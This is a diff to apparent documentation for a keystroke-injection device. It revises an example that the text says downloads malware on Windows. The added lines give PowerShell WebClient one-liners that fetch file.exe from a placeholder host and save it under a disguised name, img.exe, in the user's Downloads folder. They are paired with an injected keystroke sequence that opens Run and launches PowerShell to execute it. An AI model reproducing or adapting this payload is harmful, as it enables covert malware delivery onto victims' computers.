@@ -58,8 +58,13 @@ Under Windows you can use something like this on Windows to download Maleware in
 
 ```Batchfile
 $client = New-Object System.Net.WebClient
-$client.DownloadFile("http://www.example.com/file.exe", "C:\")
+$client.DownloadFile("http://www.example.com/file.exe", "C:\Users\%user%\Downloads\img.exe")
 ```
+or
+```Batchfile
+(New-Object System.Net.WebClient).DownloadFile("http://www.example.com/file.exe", "C:\Users\%user%\Downloads\img.exe")
+```
+See [3 ways to download files with PowerShell](https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell) for other ways
 
 This would result in a String like this:
 ```
@@ -67,9 +72,7 @@ K: WIN R
 W: 50
 S: powershell
 E:
-S: $client = New-Object System.Net.WebClient
-E:
-S: $client.DownloadFile("http://www.example.com/file.exe", "C:\")
+S: (New-Object System.Net.WebClient).DownloadFile("http://www.example.com/file.exe", "C:\Users\%user%\Downloads\img.exe")
 E:
 ```
 
